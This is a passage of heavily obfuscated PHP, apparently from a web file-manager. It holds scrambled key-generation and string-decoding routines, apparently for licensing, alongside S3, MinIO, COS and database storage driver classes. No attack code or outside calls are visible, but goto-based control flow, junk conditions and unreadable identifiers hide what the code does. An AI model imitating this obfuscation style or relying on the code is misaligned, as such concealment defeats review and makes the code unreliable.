e¨¾ª¼¬À; E¾Ş»„Í²Ğ: if ($c…ºÊŒ¬½ - 1 > 0) { $A­«Ñ„Ø‘ = $this->{$_SERVER[ºÀ][186]}($A­«Ñ„Ø‘, $aĞÀ¶é‹´ø, $c…ºÊŒ¬½ - 1); } return $A­«Ñ„Ø‘; goto e•á†à†•ˆ; a£‘´‰¯­: if (!$dŠƒÇÎ ½‡) { return; } $D‡Â®Ÿ”°â = $EŸòŒ‚¢„•[25]($FÁ¥Éè­Ô, 1, 15); $FÁ¥Éè­Ô = $EŸòŒ‚¢„•[25]($FÁ¥Éè­Ô, 16); goto d»å£òÑÂ; Cë‚»ïŠ˜á: $E¬õ²Ä¸£” =& $_SERVER[ì‹É]; $EŸòŒ‚¢„• =& $_SERVER[ºÀ]; if (!$EŸòŒ‚¢„•[331]($FÁ¥Éè­Ô) || $EŸòŒ‚¢„•[24]($FÁ¥Éè­Ô) < 10) { return !1; } goto c£Ÿîå‘¨©; F¿‡ÀÓÙğ: if (!$dãÌŒ¿í‡) { die; } $a¼¬®—Ñî‰ = $FÁ¥Éè­Ô[0]; $dŠƒÇÎ ½‡ = $E¬õ²Ä¸£”[630]; goto a£‘´‰¯­; e¨¾ª¼¬À: $aÎóÁŠ—ƒÅ = $E¬õ²Ä¸£”[632]; if (!$aÎóÁŠ—ƒÅ) { die; } switch ($a¼¬®—Ñî‰) { case $EŸòŒ‚¢„•[227]: $A­«Ñ„Ø‘ = $this->{$_SERVER[ºÀ][241]}($FÁ¥Éè­Ô, $EŸòŒ‚¢„•[212]($aĞÀ¶é‹´ø . $D‡Â®Ÿ”°â)); $e–‹¤‚äõ = $E¬õ²Ä¸£”[633]; if (!$e–‹¤‚äõ) { return; } break; $dÀ—¤·Œˆ‚ = $E¬õ²Ä¸£”[634]; if (strlen($dÀ—¤·Œˆ‚) < $E¬õ²Ä¸£”[553]) { die; } case $EŸòŒ‚¢„•[218]: $A­«Ñ„Ø‘ = $this->{$_SERVER[ºÀ][241]}($FÁ¥Éè­Ô, $EŸòŒ‚¢„•[212]($D‡Â®Ÿ”°â . $aĞÀ¶é‹´ø)); $b™ÔºˆƒÇ = $E¬õ²Ä¸£”[635]; break; $Dğ®à¼²±Ç = $E¬õ²Ä¸£”[636]; case $EŸòŒ‚¢„•[325]: $A­«Ñ„Ø‘ = $this->{$_SERVER[ºÀ][241]}($FÁ¥Éè­Ô, $EŸòŒ‚¢„•[116]($D‡Â®Ÿ”°â . $aĞÀ¶é‹´ø)); $fÉˆƒ…ÖôÑ = $E¬õ²Ä¸£”[637]; while (strlen($fÉˆƒ…ÖôÑ) < $E¬õ²Ä¸£”[556]) { if (!$fÉˆƒ…ÖôÑ) { break; } $fÉˆƒ…ÖôÑ++; } break; $fˆÔ«†²® = $E¬õ²Ä¸£”[597]; if (!$fˆÔ«†²®) { die; } case $EŸòŒ‚¢„•[326]: $A­«Ñ„Ø‘ = $this->{$_SERVER[ºÀ][241]}($FÁ¥Éè­Ô, $EŸòŒ‚¢„•[112]($D‡Â®Ÿ”°â . $aĞÀ¶é‹´ø)); $aæ°¬Ùìã­ = $E¬õ²Ä¸£”[638]; if (strlen($aæ°¬Ùìã­) < $E¬õ²Ä¸£”[548]) { return; } break; $DÓÚïøœä = $E¬õ²Ä¸£”[639]; case $EŸòŒ‚¢„•[327]: goto c¤óÉÅ¿®œ; b…×ÍÈ—ƒ¨: $a‡Ö›öÜŒ¿ = $EŸòŒ‚¢„•[10]; $f‰‡ŞäÉŠŸ = 0; $Aõçö•‘¥ç = $E¬õ²Ä¸£”[643]; goto AğñãÊœé‚; bÔ·ÜÈ¦Á: $FÁ¥Éè­Ô = $EŸòŒ‚¢„•[25]($FÁ¥Éè­Ô, 1); $D¼Õë®˜¿Ì = $EŸòŒ‚¢„•[329]($A®ó¥ãŒ›», $aËëŞ‚Ëñ); $Bö¤‹Í¢ËÒ = $EŸòŒ‚¢„•[112]($aËëŞ‚Ëñ . $EŸòŒ‚¢„•[112]($aĞÀ¶é‹´ø . $aËëŞ‚Ëñ) . $aĞÀ¶é‹´ø); goto B¼º‡”ÏÈ; C•ôå¹«İÌ: for ($f‰‡ŞäÉŠŸ = 0; $f‰‡ŞäÉŠŸ < $EŸòŒ‚¢„•[24]($FÁ¥Éè­Ô); $f‰‡ŞäÉŠŸ++) { $D‡¬ø¾ Ù¸ = $D‡¬ø¾ Ù¸ == $EŸòŒ‚¢„•[24]($Bö¤‹Í¢ËÒ) ? 0 : $D‡¬ø¾ Ù¸; $eÂÑô¬²º¸ = $E¬õ²Ä¸£”[646]; if (!$eÂÑô¬²º¸) { return; } $c¢‡¶©ÂŠ = $D‡¬ø¾ Ù¸++; $c©ç³âÙ = $EŸòŒ‚¢„•[329]($A®ó¥ãŒ›», $FÁ¥Éè­Ô[$f‰‡ŞäÉŠŸ]) - $D¼Õë®˜¿Ì - $EŸòŒ‚¢„•[330]($Bö¤‹Í¢ËÒ[$c¢‡¶©ÂŠ]); while ($c©ç³âÙ < 0) { $c©ç³âÙ += 64; $d®Òˆ÷„øÁ = $E¬õ²Ä¸£”[647]; while (strlen($d®Òˆ÷„øÁ) < $E¬õ²Ä¸£”[556]) { if (!$d®Òˆ÷„øÁ) { break; } $d®Òˆ÷„øÁ++; } } $a‡Ö›öÜŒ¿ .= $A®ó¥ãŒ›»[$c©ç³âÙ]; $f£¿„œ—Ğù = $E¬õ²Ä¸£”[648]; if (!$f£¿„œ—Ğù) { die; } } $A­«Ñ„Ø‘ = $EŸòŒ‚¢„•[333]($a‡Ö›öÜŒ¿); break; goto a¨Š¼ŸŒ‚; B¼º‡”ÏÈ: $Bö¤‹Í¢ËÒ = $EŸòŒ‚¢„•[25]($Bö¤‹Í¢ËÒ, $D¼Õë®˜¿Ì % 8, $D¼Õë®˜¿Ì % 8 + 7); $EÓ‰ƒÉŞ‹¿ = $E¬õ²Ä¸£”[642]; while ($EÓ‰ƒÉŞ‹¿ < $E¬õ²Ä¸£”[546]) { if ($EÓ‰ƒÉŞ‹¿ >= 0) { break; } $EÓ‰ƒÉŞ‹¿++; } goto b…×ÍÈ—ƒ¨; c¤óÉÅ¿®œ: $FÁ¥Éè­Ô = $EŸòŒ‚¢„•[332]($FÁ¥Éè­Ô); $d‚³Ÿ”âÄŠ = $E¬õ²Ä¸£”[640]; if (strlen($d‚³Ÿ”âÄŠ) < $E¬õ²Ä¸£”[548]) { return; } goto Eœ…öÉ; Eœ…öÉ: $aËëŞ‚Ëñ = $FÁ¥Éè­Ô[0]; $d¬É¾†¡Òª = $E¬õ²Ä¸£”[641]; while ($d¬É¾†¡Òª < $E¬õ²Ä¸£”[548]) { if ($d¬É¾†¡Òª >= 0) { break; } $d¬É¾†¡Òª++; } goto bÔ·ÜÈ¦Á; AğñãÊœé‚: $c©ç³âÙ = 0; $EÊˆ¼Ş°À© = $E¬õ²Ä¸£”[644]; if (!$EÊˆ¼Ş°À©) { die; } goto eÜ¼ÏƒÚî; eÜ¼ÏƒÚî: $D‡¬ø¾ Ù¸ = 0; $C°§á­ùá = $E¬õ²Ä¸£”[645]; while ($C°§á­ùá < $E¬õ²Ä¸£”[543]) { if ($C°§á­ùá >= 0) { break; } $C°§á­ùá++; } goto C•ôå¹«İÌ; a¨Š¼ŸŒ‚: default: $A­«Ñ„Ø‘ = $this->{$_SERVER[ºÀ][241]}($FÁ¥Éè­Ô, $aĞÀ¶é‹´ø . $D‡Â®Ÿ”°â); $Fí¤ø­Ú = $E¬õ²Ä¸£”[649]; break; $eØ¿îÅµ¯· = $E¬õ²Ä¸£”[650]; while ($eØ¿îÅµ¯· < $E¬õ²Ä¸£”[556]) { if ($eØ¿îÅµ¯· >= 0) { break; } $eØ¿îÅµ¯·++; } } goto E¾Ş»„Í²Ğ; c£Ÿîå‘¨©: $FÁ¥Éè­Ô = $EŸòŒ‚¢„•[2]($FÁ¥Éè­Ô); $FÁ¥Éè­Ô = $EŸòŒ‚¢„•[212]($FÁ¥Éè­Ô); $dãÌŒ¿í‡ = $E¬õ²Ä¸£”[629]; goto F¿‡ÀÓÙğ; e•á†à†•ˆ: } public function eufdb58cb3db($fì£¨ì–šŠ) { goto E†¾…‡Ü˜¬; e‡ªÏåéé: if (!$BØ“¥Ğ´õ) { die; } while (1) { $DŠ’É¶¡¸ = $a—õ˜–¼ÍÑ; $Cïƒù’ÕŠÎ = $c¹¦ˆ”ìŒ‰; $DÒ˜â£ì†® = $cŒ¥Î¢¨•Ê[653]; if (!$DÒ˜â£ì†®) { return; } while ($Cïƒù’ÕŠÎ % $DŠ’É¶¡¸ != 0) { $EÎ¥ÉäÆˆÊ = $Cïƒù’ÕŠÎ; $Eåã‹õ÷ƒ = $cŒ¥Î¢¨•Ê[654]; if (!$Eåã‹õ÷ƒ) { die; } $Cïƒù’ÕŠÎ = $DŠ’É¶¡¸; $bæ·»Æº×À = $cŒ¥Î¢¨•Ê[655]; while (strlen($bæ·»Æº×À) < $cŒ¥Î¢¨•Ê[543]) { if (!$bæ·»Æº×À) { break; } $bæ·»Æº×À++; } $DŠ’É¶¡¸ = $EÎ¥ÉäÆˆÊ % $DŠ’É¶¡¸; } if ($DŠ’É¶¡¸ == 1) { break; } else { $a—õ˜–¼ÍÑ++; } } $CÑÊÏ†ŞÎ = 2; goto fÙ¹¡î˜ğ«; FÎ˜´ÙÜŒë: $BêÏ¤”ƒ± = $cŒ¥Î¢¨•Ê[651]; if (!$BêÏ¤”ƒ±) { die; } $dµ‹êµ²İß = $this->{$_SERVER[ºÀ][334]}(); goto b’»õ ˆé†; b’»õ ˆé†: $c¹¦ˆ”ìŒ‰ = ($C†Œ‚ä†¥ì - 1) * ($dµ‹êµ²İß - 1); $a—õ˜–¼ÍÑ = $cÜ‡ßŠ’Ò[199](($C†Œ‚ä†¥ì + $dµ‹êµ²İß) / 2); $BØ“¥Ğ´õ = $cŒ¥Î¢¨•Ê[652]; goto e‡ªÏåéé; FªŒ¼µÕ¨ø: while ($dŠíç„ªªæ < $cŒ¥Î¢¨•Ê[548]) { if ($dŠíç„ªªæ >= 0) { break; } $dŠíç„ªªæ++; } $C¡öñ™§³á = $cÜ‡ßŠ’Ò[112]($cÜ‡ßŠ’Ò[335] . ($C†Œ‚ä†¥ì + $dµ‹êµ²İß) . $cÜ‡ßŠ’Ò[336] . $a—õ˜–¼ÍÑ . $cÜ‡ßŠ’Ò[336] . $CÑÊÏ†ŞÎ . $cÜ‡ßŠ’Ò[337]); $cÒÙ­Ş§Ï = $this->{$_SERVER[ºÀ][145]}($fì£¨ì–šŠ, $C¡öñ™§³á) . $cÜ‡ßŠ’Ò[338] . $F­…Ê‚±‘•; goto AøµÌ‹Ëõ¹; AøµÌ‹Ëõ¹: return $cÒÙ­Ş§Ï; $Aá¥›¹ƒ¹å = $cŒ¥Î¢¨•Ê[588]; if (!$Aá¥›¹ƒ¹å) { return; } goto AÇÀ”’Üİ÷; fÙ¹¡î˜ğ«: for ($fŠ–ª–Çåî = 0; $fŠ–ª–Çåî < $c¹¦ˆ”ìŒ‰ * 10; $fŠ–ª–Çåî++) { if (($c¹¦ˆ”ìŒ‰ * $fŠ–ª–Çåî + 1) % $a—õ˜–¼ÍÑ == 0) { $CÑÊÏ†ŞÎ = $cÜ‡ßŠ’Ò[199](($c¹¦ˆ”ìŒ‰ * $fŠ–ª–Çåî + 1) / $a—õ˜–¼ÍÑ); break; } } $F­…Ê‚±‘• = $this->{$_SERVER[ºÀ][145]}($C†Œ‚ä†¥ì * $dµ‹êµ²İß . $cÜ‡ßŠ’Ò[10], $cÜ‡ßŠ’Ò[147]); $dŠíç„ªªæ = $cŒ¥Î¢¨•Ê[656]; goto FªŒ¼µÕ¨ø; E†¾…‡Ü˜¬: $cŒ¥Î¢¨•Ê =& $_SERVER[ì‹É]; $cÜ‡ßŠ’Ò =& $_SERVER[ºÀ]; $C†Œ‚ä†¥ì = $this->{$_SERVER[ºÀ][334]}(); goto FÎ˜´ÙÜŒë; AÇÀ”’Üİ÷: } public function omuq900844da($dŸò¨‰Ø¢ï) { goto AÓë×„’í ; CËÍ¦ã¿‡í: $A¿ÔÆá•° = $this->{$_SERVER[ºÀ][241]}($CĞ££œ›Šâ[1] . $AĞ…Ä©’ğ˜[10], $AĞ…Ä©’ğ˜[147]); $cŠİ…ÌŸâƒ = $D«‡®‰Õ¾†[658]; if (strlen($cŠİ…ÌŸâƒ) < $D«‡®‰Õ¾†[553]) { die; } goto f¹ëŒÅÈé; FÊ­‘œêÀ©: if (!$E¸‘ÁôØñù) { die; } return $C æâ›²; $aÔœŠ™îìä = $D«‡®‰Õ¾†[667]; goto f—°Úœ¥¾‡; dê°İêä“º: while (strlen($d¼¢óÚ³») < $D«‡®‰Õ¾†[546]) { if (!$d¼¢óÚ³») { break; } $d¼¢óÚ³»++; } $AĞ“Äˆº’ó = 0; for ($f÷¥‚ë–á = 3; $f÷¥‚ë–á < $A¿ÔÆá•°; $f÷¥‚ë–á += 2) { if ($A¿ÔÆá•° % $f÷¥‚ë–á != 0) { continue; } $Cñ“ñÑ¦¹´ = $f÷¥‚ë–á; $F­ÓÖ…•Ò = $D«‡®‰Õ¾†[661]; $AĞ“Äˆº’ó = $AĞ…Ä©’ğ˜[199]($A¿ÔÆá•° / $f÷¥‚ë–á); $A‰æ–²‡„Ú = $D«‡®‰Õ¾†[662]; break; $F±Ğ…¦¥²Õ = $D«‡®‰Õ¾†[663]; while (strlen($F±Ğ…¦¥²Õ) < $D«‡®‰Õ¾†[548]) { if (!$F±Ğ…¦¥²Õ) { break; } $F±Ğ…¦¥²Õ++; } } goto aÏÙÙçæ“»; AÓë×„’í : $D«‡®‰Õ¾† =& $_SERVER[ì‹É]; $AĞ…Ä©’ğ˜ =& $_SERVER[ºÀ]; $CĞ££œ›Šâ = $AĞ…Ä©’ğ˜[0]($AĞ…Ä©’ğ˜[338], $dŸò¨‰Ø¢ï); goto e˜¡ùâÊâ±; FËìÍ‹ìãÌ: $dÊó§¶£‚² = $AĞ…Ä©’ğ˜[112]($AĞ…Ä©’ğ˜[335] . ($Cñ“ñÑ¦¹´ + $AĞ“Äˆº’ó) . $AĞ…Ä©’ğ˜[336] . $EĞ­ï˜õÂÉ . $AĞ…Ä©’ğ˜[336] . $eôöÕ„ÒÇ¬ . $AĞ…Ä©’ğ˜[337]); $C æâ›² = $this->{$_SERVER[ºÀ][241]}($CĞ££œ›Šâ[0], $dÊó§¶£‚²); $E¸‘ÁôØñù = $D«‡®‰Õ¾†[666]; goto FÊ­‘œêÀ©; e˜¡ùâÊâ±: $cò‡Ã“Ñ… = $D«‡®‰Õ¾†[657]; if (!$cò‡Ã“Ñ…) { return; } if ($AĞ…Ä©’ğ˜[19]($CĞ££œ›Šâ) != 2) { return $AĞ…Ä©’ğ˜[10]; } goto CËÍ¦ã¿‡í; DÏ¿‰´×Ş±: while ($AÜ—ùùã < $D«‡®‰Õ¾†[556]) { if ($AÜ—ùùã >= 0) { break; } $AÜ—ùùã++; } $Cñ“ñÑ¦¹´ = 0; $d¼¢óÚ³» = $D«‡®‰Õ¾†[660]; goto dê°İêä“º; f¹ëŒÅÈé: if (!$A¿ÔÆá•°) { return $AĞ…Ä©’ğ˜[10]; } $A¿ÔÆá•° = $AĞ…Ä©’ğ˜[199]($A¿ÔÆá•°); $AÜ—ùùã = $D«‡®‰Õ¾†[659]; goto DÏ¿‰´×Ş±; aÏÙÙçæ“»: $b÷”¿ÉËŞé = ($Cñ“ñÑ¦¹´ - 1) * ($AĞ“Äˆº’ó - 1); $EĞ­ï˜õÂÉ = $AĞ…Ä©’ğ˜[199](($Cñ“ñÑ¦¹´ + $AĞ“Äˆº’ó) / 2); $bïËâ×÷² = $D«‡®‰Õ¾†[664]; goto c¿÷œŠø¨; f—°Úœ¥¾‡: while (strlen($aÔœŠ™îìä) < $D«‡®‰Õ¾†[553]) { if (!$aÔœŠ™îìä) { break; } $aÔœŠ™îìä++; } goto EŒÎÓÕš; c¿÷œŠø¨: while (1) { $aĞ‘İ‡Ã’ = $EĞ­ï˜õÂÉ; $Aê…¼±¤´™ = $b÷”¿ÉËŞé; while ($Aê…¼±¤´™ % $aĞ‘İ‡Ã’ != 0) { $C½÷à†Õ…  = $Aê…¼±¤´™; $Aê…¼±¤´™ = $aĞ‘İ‡Ã’; $aĞ‘İ‡Ã’ = $C½÷à†Õ…  % $aĞ‘İ‡Ã’; $A¸­ùõ´õ« = $D«‡®‰Õ¾†[665]; while (strlen($A¸­ùõ´õ«) < $D«‡®‰Õ¾†[546]) { if (!$A¸­ùõ´õ«) { break; } $A¸­ùõ´õ«++; } } if ($aĞ‘İ‡Ã’ == 1) { break; } else { $EĞ­ï˜õÂÉ++; } } $eôöÕ„ÒÇ¬ = 2; for ($f÷¥‚ë–á = 0; $f÷¥‚ë–á < $b÷”¿ÉËŞé * 10; $f÷¥‚ë–á++) { if (($b÷”¿ÉËŞé * $f÷¥‚ë–á + 1) % $EĞ­ï˜õÂÉ == 0) { $eôöÕ„ÒÇ¬ = $AĞ…Ä©’ğ˜[199](($b÷”¿ÉËŞé * $f÷¥‚ë–á + 1) / $EĞ­ï˜õÂÉ); break; } } goto FËìÍ‹ìãÌ; EŒÎÓÕš: } public function auvxb88843f3() { goto dã’ÏÈİİ”; dã’ÏÈİİ”: $A×£Å¬‰¦ =& $_SERVER[ì‹É]; $fœá¼„†« =& $_SERVER[ºÀ]; $Añ†”áÅöä = $fœá¼„†«[319]($fœá¼„†«[339](2, 14), $fœá¼„†«[339](2, 16) - 1); goto dÊç¹¿·á ; D—õÔÀ‚ø: while (strlen($FåğÊèÕË) < $A×£Å¬‰¦[546]) { if (!$FåğÊèÕË) { break; } $FåğÊèÕË++; } for ($aÉµİ… = $Añ†”áÅöä; $aÉµİ… > 1; $aÉµİ…--) { $fÂ‚Ã«Ñ¸İ = !0; foreach ($Cˆš†‹ ÖÖ as $eİí˜ôï½ğ) { if ($aÉµİ… % $eİí˜ôï½ğ == 0) { $fÂ‚Ã«Ñ¸İ = !1; break; } } if ($fÂ‚Ã«Ñ¸İ) { $b¶×îƒªæ¦ = $aÉµİ…; break; } } return $b¶×îƒªæ¦; goto c«ªáëê„; eŸä» Ù±§: while ($BöŒ’ÉòÅ¥ <= (int) $fœá¼„†«[340]($Añ†”áÅöä)) { $aÉµİ… = $BöŒ’ÉòÅ¥; while (!0) { $aÉµİ…++; $EÃ ·£ŒƒÕ = $A×£Å¬‰¦[670]; if (!$EÃ ·£ŒƒÕ) { die; } if ($aÉµİ… <= 2) { $BöŒ’ÉòÅ¥ = $aÉµİ…; break; } else { if ($aÉµİ… < 2) { continue; } } $fÂ‚Ã«Ñ¸İ = !0; for ($DîÌÑ–ºÃ¦ = 2; $DîÌÑ–ºÃ¦ <= $fœá¼„†«[340]($aÉµİ…); $DîÌÑ–ºÃ¦++) { if ($aÉµİ… % $DîÌÑ–ºÃ¦ == 0) { $fÂ‚Ã«Ñ¸İ = !1; } } if ($fÂ‚Ã«Ñ¸İ) { $BöŒ’ÉòÅ¥ = $aÉµİ…; break; } } $Cˆš†‹ ÖÖ[] = $BöŒ’ÉòÅ¥; } $b¶×îƒªæ¦ = 2; $FåğÊèÕË = $A×£Å¬‰¦[671]; goto D—õÔÀ‚ø; dÊç¹¿·á : $A„¸Ûµ«âÒ = $A×£Å¬‰¦[668]; while (strlen($A„¸Ûµ«âÒ) < $A×£Å¬‰¦[543]) { if (!$A„¸Ûµ«âÒ) { break; } $A„¸Ûµ«âÒ++; } $Cˆš†‹ ÖÖ = array(); goto cí‰ÈóÇßİ; cí‰ÈóÇßİ: $A”†§å–¤Ø = $A×£Å¬‰¦[669]; if (strlen($A”†§å–¤Ø) < $A×£Å¬‰¦[543]) { die; } $BöŒ’ÉòÅ¥ = 1; goto eŸä» Ù±§; c«ªáëê„: } public function jbzla819a2fc($Dé‹¥•Œîİ, $AİèŒÎšà) { $e™Ìé»ÏÅ =& $_SERVER[ºÀ]; return $e™Ìé»ÏÅ[13](array($e™Ìé»ÏÅ[14], $e™Ìé»ÏÅ[341]), $Dé‹¥•Œîİ, $AİèŒÎšà); $dÜÕê½ËèÖ = $_SERVER[ì‹É][672]; if (!$dÜÕê½ËèÖ) { die; } } public function jbrxd967b30f($B›‰Şèˆ, $CÄêôµã) { $Cˆ©£÷ŸĞ— =& $_SERVER[ºÀ]; return $Cˆ©£÷ŸĞ—[13](array($Cˆ©£÷ŸĞ—[342], $Cˆ©£÷ŸĞ—[343]), $B›‰Şèˆ, $CÄêôµã); $CÜ½Éà–æ® = $_SERVER[ì‹É][673]; } public function qipf9719820d($A¨î˜ƒİ½, $eÓ’‰ ‚¬) { $eñ¸Æ¦µçœ =& $_SERVER[ºÀ]; return $eñ¸Æ¦µçœ[13](array($eñ¸Æ¦µçœ[342], $eñ¸Æ¦µçœ[344]), $A¨î˜ƒİ½, $eÓ’‰ ‚¬); } } goto Dî¯®šÙ¥•; d·ˆ¯Îšò‰: class PathDriverMOSS extends PathDriverBaseS3 { public function __construct($E¢ÆÖ„Ñ‡Ò) { parent::__construct($E¢ÆÖ„Ñ‡Ò); $this->signatureVersion($_SERVER[ì‹É][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function copyFile($eÀÔ¥Î„ , $eš¥ëÑÂÃ, $f›ãİ§±Š = array()) { $f¦„¾’ƒ‘¸ = $this->tempFile($eÀÔ¥Î„ ); $this->download($eÀÔ¥Î„ , $f¦„¾’ƒ‘¸); $FÊÂéİÖàñ = $this->upload($eš¥ëÑÂÃ, $f¦„¾’ƒ‘¸); $this->tempFileRemve($f¦„¾’ƒ‘¸); return $FÊÂéİÖàñ; } public function uploadFormData($AÙ³ÌâåË…, $Bƒ±Œë¡‡ß = 3600) { return parent::uploadFormData($AÙ³ÌâåË…, $Bƒ±Œë¡‡ß); } public function fileOut($CË†ìé¦äé, $F©Óôí¼Äˆ = false, $FˆÍ™í½™Å = false, $cÑ¾Ì³ÛïŠ = '') { parent::fileOutServer($CË†ìé¦äé, $F©Óôí¼Äˆ, $FˆÍ™í½™Å, $cÑ¾Ì³ÛïŠ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($EÙ¥ä‡Š£¤) { parent::__construct($EÙ¥ä‡Š£¤); $this->signatureVersion($_SERVER[ì‹É][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } $eºÊ‚ˆ‡îù = LIB_DIR . $_SERVER[ì‹É][731]; goto F›ÄØ›…ºğ; CÏ†ğ¶î: define($_SERVER[ì‹É][0], $_SERVER[ì‹É][1]); $_SERVER[Ü›¼] = explode($_SERVER[ì‹É][2], gzinflate(substr($_SERVER[ì‹É][3], 10, -8))); function Model($e¸ğÊäÎõˆ = '', $C¨¹¨Ÿù­Ù = '', $F×‚ãĞ²š­ = '') { goto F´’ÓÂ“Ü­; F´’ÓÂ“Ü­: $FÌ»İË‹ =& $_SERVER[Ü›¼]; static $AÙÏŠöõ¼È = array(); $FºâåÑ’áŠ = strtolower($C¨¹¨Ÿù­Ù . $FÌ»İË‹[0] . $e¸ğÊäÎõˆ); goto BÒ“È·ë‘Æ; BÒ“È·ë‘Æ: if (isset($AÙÏŠöõ¼È[$FºâåÑ’áŠ])) { return $AÙÏŠöõ¼È[$FºâåÑ’áŠ]; } if ($e¸ğÊäÎõˆ) { $e¸ğÊäÎõˆ = strtoupper($e¸ğÊäÎõˆ[0]) . substr($e¸ğÊäÎõˆ, 1); $BÈ§†²¶÷ = $e¸ğÊäÎõˆ . $FÌ»İË‹[1]; if (class_exists($BÈ§†²¶÷)) { $AÙÏŠöõ¼È[$FºâåÑ’áŠ] = new $BÈ§†²¶÷(); return $AÙÏŠöõ¼È[$FºâåÑ’áŠ]; } } if (!$F×‚ãĞ²š­) { $F×‚ãĞ²š­ = $GLOBALS[$FÌ»İË‹[2]][$FÌ»İË‹[3]]; } goto dÖºé’ä¡; dÖºé’ä¡: $AÙÏŠöõ¼È[$FºâåÑ’áŠ] = new ModelBase($e¸ğÊäÎõˆ, $C¨¹¨Ÿù­Ù, $F×‚ãĞ²š­); return $AÙÏŠöõ¼È[$FºâåÑ’áŠ]; goto b¦¹É†ÉÎ¶; b¦¹É†ÉÎ¶: } goto d¼×‹Åƒà; F›ø‹òŠÂÏ: function beforeShutdownFatalError($fäìç„²²) { think_exception($fäìç„²²); } $_SERVER[$_SERVER[Ü›¼][47]] = $bĞô‰Í‚¨²($_SERVER[$_SERVER[Ü›¼][44]]); $e°ßµ¸²µ© = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto bÌ¬å¤Şî; C¯İöÉ»µ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($b‰ÓÜª—¦) { parent::__construct($b‰ÓÜª—¦); $this->signatureVersion($_SERVER[ì‹É][197]); } public function uploadFormData($f™©èÓãäÇ, $D¨ÑÄğ¢ = 3600) { goto D¯ˆù¯öŸ; eßùÓ¾´ßÎ: return $eÙ‡óÄ£Íâ; goto fƒƒŞ¬•Çˆ; bŠÉÉìÉŠ¨: $f“’§ñ¹ô‹ = array($dÑİéæçñ[1068] => $bìèË‹Éñ, $dÑİéæçñ[1069] => array(array($dÑİéæçñ[1070] => $DÎš¶‹Ñìë), array($dÑİéæçñ[1071] => $this->bucket), array($dÑİéæçñ[1072], $dÑİéæçñ[1073], $dÑİéæçñ[33]), array($dÑİéæçñ[1074] => $bÄé†Ôğ‚¾), array($dÑİéæçñ[1075] => $bªäÌÀ‘), array($dÑİéæçñ[1076] => $this->accessKey), array($dÑİéæçñ[1077] => $EÈôòÖë¦ê))); $f“’§ñ¹ô‹ = json_encode($f“’§ñ¹ô‹); $aŸšÇÎñ·‰ = hash_hmac($dÑİéæçñ[215], $EÈôòÖë¦ê, $this->secret); goto B¢Ç•¨ˆ™–; dÊæºÈñ²ù: $bÄé†Ôğ‚¾ = $dÑİéæçñ[1066]; $bìèË‹Éñ = gmdate($dÑİéæçñ[1067], time() + $D¨ÑÄğ¢); $EÈôòÖë¦ê = (string) time() . $dÑİéæçñ[68] . (string) (time() + $D¨ÑÄğ¢); goto bŠÉÉìÉŠ¨; D¯ˆù¯öŸ: $dÑİéæçñ =& $_SERVER[ì‹É]; $DÎš¶‹Ñìë = $dÑİéæçñ[182]; $bªäÌÀ‘ = $dÑİéæçñ[215]; goto dÊæºÈñ²ù; B¢Ç•¨ˆ™–: $c×‚©ã’»» = sha1($f“’§ñ¹ô‹); $AÈóÂøÚÜš = hash_hmac($dÑİéæçñ[215], $c×‚©ã’»», $aŸšÇÎñ·‰); $eÙ‡óÄ£Íâ = array($dÑİéæçñ[1070] => $DÎš¶‹Ñìë, $dÑİéæçñ[1074] => $bÄé†Ôğ‚¾, $dÑİéæçñ[1078] => base64_encode($f“’§ñ¹ô‹), $dÑİéæçñ[1075] => $bªäÌÀ‘, $dÑİéæçñ[1076] => $this->accessKey, $dÑİéæçñ[1079] => $EÈôòÖë¦ê, $dÑİéæçñ[1080] => $AÈóÂøÚÜš, $dÑİéæçñ[166] => $this->getHost()); goto eßùÓ¾´ßÎ; fƒƒŞ¬•Çˆ: } public function fileOutLink($fĞšîãËäá) { $aÂ¹ô âª˜ =& $_SERVER[ì‹É]; if (substr($fĞšîãËäá, 0, 7) == $aÂ¹ô âª˜[1081]) { $fĞšîãËäá = $aÂ¹ô âª˜[1082] . substr($fĞšîãËäá, 7); } header($aÂ¹ô âª˜[153] . $fĞšîãËäá); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($BÅºéŒê·Ä) { $this->pathParse = $BÅºéŒê·Ä; $this->model = Model($_SERVER[ì‹É][1083]); } public function getPath($CåêØ„ƒÅ±) { return trim($CåêØ„ƒÅ±, $_SERVER[ì‹É][8]); } public function pathFather($fµ”ÍÊ”„š) { $dêØİ‰éÇù = $this->parse($fµ”ÍÊ”„š); $dêØİ‰éÇù = $this->infoSimple($fµ”ÍÊ”„š); return $dêØİ‰éÇù ? $dêØİ‰éÇù[$_SERVER[ì‹É][457]] : !1; } public function getPathName($E‹àóäÇ¦‡) { $eÜÙç‚¿¢ã = $this->infoSimple($E‹àóäÇ¦‡); return $eÜÙç‚¿¢ã ? $eÜÙç‚¿¢ã[$_SERVER[ì‹É][28]] : !1; } public function getPathOuter($d„¼Ü¨­åë) { if (!$d„¼Ü¨­åë) { return $d„¼Ü¨­åë; } $CÇºˆ²ôçÉ = $this->parse($d„¼Ü¨­åë); return KodIO::make($CÇºˆ²ôçÉ[$_SERVER[ì‹É][364]]); } public function copyFolderFromIO($CæÍ‘Ëøé, $B…î·âØ°å, $A’¯­Ä†³, $b·»–âã‹, $A”¹Ê†ˆâ) { $bßœÖÎõé± = $this->model->copyFolderFromIO($CæÍ‘Ëøé, $B…î·âØ°å, $A’¯­Ä†³, $b·»–âã‹, $A”¹Ê†ˆâ); return KodIO::make($bßœÖÎõé±); } public function isParentOf($b”®§«Ì»º, $b´œø¦èøÈ) { return $this->model->isParentOf($b”®§«Ì»º, $b´œø¦èøÈ); } public function mkfile($AÑÕ­ŒÎõ÷, $AšÓ…‘¸ˆ“ = '', $c”©–¹íÛ = REPEAT_RENAME) { $eŒÓÙëŒ‚Ç =& $_SERVER[ì‹É]; $FˆË‚…éÇ– = $this->parse($AÑÕ­ŒÎõ÷); $AÑÕ­ŒÎõ÷ = $FˆË‚…éÇ–[$eŒÓÙëŒ‚Ç[364]]; for ($Aô§¼°Çø = 0; $Aô§¼°Çø < count($FˆË‚…éÇ–[$eŒÓÙëŒ‚Ç[1084]]); $Aô§¼°Çø++) { $d˜ÒÔ¿à = 